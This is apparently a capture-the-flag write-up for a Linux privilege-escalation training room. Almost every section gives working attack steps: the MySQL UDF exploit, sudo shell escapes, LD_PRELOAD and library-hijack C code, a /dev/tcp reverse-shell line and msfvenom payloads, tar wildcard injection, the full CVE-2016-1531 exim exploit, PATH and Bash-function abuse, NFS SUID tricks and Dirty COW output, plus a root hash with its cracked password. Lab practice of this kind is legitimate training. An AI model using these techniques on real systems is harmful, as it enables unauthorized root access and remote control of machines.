# Linux Privesc

## Intro

This room will cover a wide variety of Linux Privilege escalation methods. A user account is given so that we can log in over SSH.

**Questions**

    1. Run the "id" command. What is the result?

`uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)`

## Service Exploits

The MySQL service is running as root and the root user for the service does not have a password assigned. [This](https://www.exploit-db.com/exploits/1518 "ExploitDB") is the exploit we will be using in this task. It takes advantage of User Defined Functions to run systems commands as root via the MySQL service.

Exploit is already loaded on the machine for us. The exploit functions in the following manner:

* `gcc -g -c raptor_udf2.c -fPIC` & `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc` to compile the exploit code.
* `mysql -u root` to connect to the MySQL service as the root user with a blank password.
* `use mysql;`
* `create table foo(line blob);`
* `insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`
* `select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';` 
* `create function do_system returns integer soname 'raptor_udf2.so';` 
* `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');` - copies /bin/bash to a new location and marks the SUID bit
* `/tmp/rootbash -p` - running our newly created file with -p will give us a permanent root shell.

## Weak File Permissions - Readable /etc/shadow

The `/etc/shadow` file contains password hashes and is only usually readable by the root user

Each line represents a user and their password hash can be found between the first and second colons of each line.

**Questions**

    1. What is the root users password hash?

$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0

    2. What hashing algorithm was used to produce the root user's password hash?

sha512crypt

    3. What is the root user's password?

password123

## Weak File Permissions - Writeable /etc/shadow

If the `/etc/shadow` file is writeable then we can generate a new password with the command `mkpasswd -m sha-512 <PASSWORD>`, and replace the root users password with the one we have generated. The root user can then be logged into with the newly created password.

## Weak File Permissions - Writeable /etc/passwd

The /etc/passwd file contains information about user accounts. It can be read by anyone, however it should only be writeable by the root user. Historically the `/etc/passwd` file stored password hashes and some versions of Linux still allow password hashes to be stored there.

A new password hash can be generated with `openssl passwd <PASSWORD>`. This can then be place in between the first and second colon of the root users row in `/etc/passwd`.

Alternatively the root users row can be copied and appended to the bottom of the file, changing the first instance of the word 'root' to 'newroot' and replacing the password hash the same way as before.

**Questions**

    1. Run the "id" command as the newroot user. What is the result?

uid=0(root) gid=0(root) groups=0(root)

## Sudo - Shell Escape Sequences

List the programs that sudo allows your user to run with `sudo -l`.

[GTFOBins](https://gtfobins.github.io/"GTFOBins") is a good resource for privilege escalation. If a program is listed with sudo as a function, it can be used to escalate privileges, usually via an escape sequence.

`sudo -l`

```
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

###### iftop

`sudo iftop`

`!`

`/bin/bash`

###### find

`sudo find . -exec /bin/bash \; -quit`

###### nano

`sudo nano`

`^R^X`

`reset; bash 1>&0 2>&0`

###### vim

`sudo vim`

`:!/bin/bash`

###### man

`sudo man man`

`!/bin/bash`

###### awk

`sudo awk 'BEGIN {system("/bin/bash")}'`

###### less

`sudo less /etc/profile`

`!/bin/bash`

###### ftp

`sudo ftp`

`!/bin/bash`

###### nmap

`sudo nmap --interactive`

`!bash`

**OR**

`TF=$(mktemp)`

`echo 'os.execute("/bin/bash")' > $TF`

`sudo nmap --script=$TF`

###### more

`sudo more /etc/profile`

`!/bin/bash`

**Questions**

    1. How many programs is "user" allowed to run via sudo? 

11

    2. One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

apache2

    3. Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.

`sudo apache2 -f /etc/shadow`
```
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$2GU/oXzc2$dXX8tFqwr2ENjPxZ9xgyB6PjEfJtxFc97hUt1pcbQw7MJVv2ZdL7lEdE4/XDi5M2MSxSgItJfdmgypKMdZoEm/:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```

## Sudo - Environment Variables

Sudo can be configured to inherit certain environment variables from the user's environment. `sudo -l` will show which environment variables are inherited.

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
`setresuid()` - sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process. By setting these all to 0 they are set to the root user.

`sudo LD_PRELOAD=/tmp/preload.so less` now gives a root shell.

---

Run ldd against the apache2 program file to see which shared libraries are used by the program: `ldd /usr/sbin/apache2`

Next a shared object is created with the same name as one of the listed libraries `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

Running `sudo LD_LIBRARY_PATH=/tmp apache2` now grants root access.

**Practical**

Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re run.

```
user@debian:~$ mv /tmp/libcrypt.so.1 /tmp/libpcre.so.3
user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
apache2: symbol lookup error: apache2: undefined symbol: pcre_free
user@debian:~$ echo "void pcre_free(){}" >> /home/user/tools/sudo/library_path.c 
user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
apache2: symbol lookup error: apache2: undefined symbol: pcre_free
user@debian:~$ gcc -o /tmp/libpcre.so.3 -shared -fPIC /home/user/tools/sudo/library_path.c
user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
root@debian:/home/user# 
```


Basically another line needed to be added so that the compiler is satisfied. The exploit runs and we have root access.

## Cron Jobs - File Permissions

Cron jobs are programs or scripts that users schedule to run at specific times or intervals. Cron table files store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

**Practical**

"Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

```shell
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`
```
Set up a netcat listener on your own machine and wait for it to connect."

---

I'm not a fan of just stealing code in order to complete this task so instead I will generate a payload with msfvenom - `msfvenom -p cmd/unix/reverse_netcat LHOST=10.11.32.89 LPORT=4444` - this will allow me to replace the file with this in order to get the reverse shell sent back to my listener.

When the reverse shell is sent back it is a root shell as expected.

## Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab: `cat /etc/crontab`

Note that the path variable begins with `/home/user`.

Create a file called `overwrite.sh` that contains the following contents 

```shell
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

This can then be set to executable with `chmod +x /home/user/overwrite.sh`.

As the crontab runs as root, this will create a new bash shell at `/tmp/rootbash` which then has the SUID bit set so that permissions can be retained.

Now running `/tmp/rootbash -p` will grant a root shell.

**Questions**

    1. What is the value of the PATH variable in /etc/crontab?

`/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

## Cron Jobs - Wildcards

`cat /usr/local/bin/compress.sh`

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

The tar command is being run with a wildcard in the users home directory.

msfvenom can be used to generate a payload for a Linux netcat reverse shell. 
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.32.89 LPORT=4444 -f elf -o shell.elf`

Now we begin our listener on port 4444

Next move back to the victim and run these three commands:

`touch /home/user/--checkpoint=1`

`touch /home/user/--checkpoint-action=exec=shell.elf`

`chmod +x /home/user/shell.elf`

Now when compress.sh is run, the wildcard will expand to include these files. Since their filenames are valid command line options, tar will recognise them as such and treat them as options rather than filenames.

When the reverse shell comes back to our machine it is a root shell.

## SUID/SGID Executables - Known Exploits

Find all the SUID/SGID executables on the machine with: 

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

```
user@debian:~/tools/suid/exim$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```

Note that `usr/bin/exim4.84-3` appears in the results. Find a known exploit for this this version. 

**EXPLOIT CODE**
```sh
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```
Found [here](https://www.exploit-db.com/exploits/39535 "exploitdb").

Running this exploit gave a root shell on the machine.

## SUID / SGID Executables - Shared Object Injection

The `/usr/local/bin/sudi-so` SUID executable is vulnerable to shared object injection. Executing this process causes a progress bar to appear before exiting. 

Run strace on the file and search the output for open/access calls and for "no such file errors": `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

First make the config directory, then create some simple c code to spawn a bash shell.

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system("/bin/bash -p");
}
```

Compile this into a shared object at the location the `suid-so` executable was looking for it (/home/user/.config)

`gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c`

Now when the executable `suid-so` is ran we are given a root shell.

## SUID / SGID Executables - Environment Variables

The `/usr/local/bin/suid-env` executable can be exploited as it inherits the PATH variable and attempts to execute something without specifying the absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver: `/usr/local/bin/suid-env`

Run `strings /usr/local/bin/suid-env`. This will show that the `service` executable is being called but an absolute path is not specified.

Here is some simple c code to generate a shell

```c
int main() {
    setuid(0);
    system("/bin/bash -p");
}
```

Let's compile this code in the current location with gcc:`gcc -o service /home/user/tools/suid/service.c`. Now we prepend our location to the users PATH variable. `PATH=/home/user/tools/suid:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin`.

Now when `suid-env` is run then our service file is called instead which will spawn a root shell.

## SUID / GUID Executables - Abusing Shell Features (#1)

There is another binary located at `/use/local/bin/sudi-env2` that instead used the absolute path for service (`/usr/sbin/service`). This can be verified with `strings /usr/local/bin/suid-env2`.

In Bash versions prior to 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

It is possible to create a new bash function with the name "`/usr/sbin/service`" and then export that function with:

`function /usr/sbin/service { /bin/bash -p; }`

`export -f /usr/sbin/service`

Now when the `suid-env2` executable is ran a root shell is obtained

## SUID / SGID Executables - Abusing Shell Features (#2)

The following will not work on bash versions above 4.4.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash: `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Now executing `/tmp/rootbash -p` will give a shell with root privileges.

## Passwords and Keys - History Files

If a user types their password on the command line instead of into a password prompt, it may get recorded in a history file.

Execute `cat ~/.*history | less`

Note that the user has attempted to connect to a MySQL server at somepoint. As they mistyped their command line prompt, we know their password and the root user can now be switched to.

**Questions**

    1. What is the full mysql command the user executed?

`mysql -h somehost.local -uroot -ppassword123`

## Passwords and Keys - Config Files

Config files often contain passwords in plaintext or other reversible formats.

In our users home directory there is an openvpn configuration file. This configuration file references another location where the root users details can be found.

`cat myvpn.ovpn` shows an interesting line - `auth-user-pass /etc/openvpn/auth.txt`

Examining this file provides the root users credentials

**Questions**

    1. What file did you find the root user's credentials in?   

`/etc/openvpn/auth.txt`

##  Passwords & Keys - SSH Keys

You can look for hidden files with `ls -la`. In the root directory there appears to be a hidden `.ssh` directory. In this directory there is a file called `root_key` which is clearly an RSA key.

Copying the contents over to the attacker machine and giving it the correct permissions with `chmod 600 root_key` allows us to login as the root user over ssh with `ssh -i root_key root@10.10.111.198`.

## NFS

Files created via NFS inherit the **remote** users ID. If the user is root and root squashing is enabled, the ID will instead be set to the "nobody" user.

The NFS share configuration can be checked with `cat etc/exports`.

Note that the `/tmp` share has root squashing disabled.

On the attacking machine we switch to the root user.

Create a mount point and mount the tmp share 

`mkdir /tmp/nfs`

`mount -o rw,vers=2 10.10.111.198:/tmp /tmp/nfs`

Generate a payload with msfvenom:
`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`

Make the file executable and set the SUID permission:

`chmod +xs /tmp/nfs/shell.elf`

On the victim machine we can run this file to get a root shell

**Questions**

    1. What is the name of the option that disables root squashing?

`no_root_squash`

## Kernel Exploits

Kernel exploits can leave the system in an unstable state, and they should be used as a last resort.

Run the "Linux Exploit Suggester 2" tool to identify potential kernel exploits on the current system: `perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`

The popular Linux kernel exploit "Dirty COW" is listed 

An exploit is already on the machine, but in order to complete this task I will use one that I have sourced myself.

We will be using [this](https://www.exploit-db.com/exploits/40616 "ExploitDB") exploit. The exploit creates a new user with root privileges.

```
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fi2D0F2yP3cfM:0:0:pwned:/root:/bin/bash

mmap: 7f8799aa9000



ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'a'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
user@debian:~$ 
user@debian:~$ 
user@debian:~$ 
user@debian:~$ madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'a'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

Now the 'firefart' user can be logged into for a root shell.

Our of interest I attempted to run the intended exploit on the machine. The machine replaced the `passwd` binary with something that spawns a bash shell. As the SUID bit is already set on that binary, it immediately returns a root shell.